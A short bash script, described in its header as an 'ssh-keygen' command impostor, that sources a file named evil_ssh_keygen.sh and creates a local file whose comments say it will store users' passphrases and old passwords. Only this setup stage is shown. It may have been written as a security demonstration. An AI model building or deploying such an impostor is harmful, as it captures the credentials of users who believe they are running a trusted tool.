#!/bin/bash

# Bash "ssh-keygen" Command Impostor
# Joe Kamibeppu | Dec 1 2016

source ./evil_ssh_keygen.sh

# local storage of a user's sensitive information. 
# example usage: store a user's passphrases, which may be old passwords or other sensitive information 
touch sensitive_user_info.txt

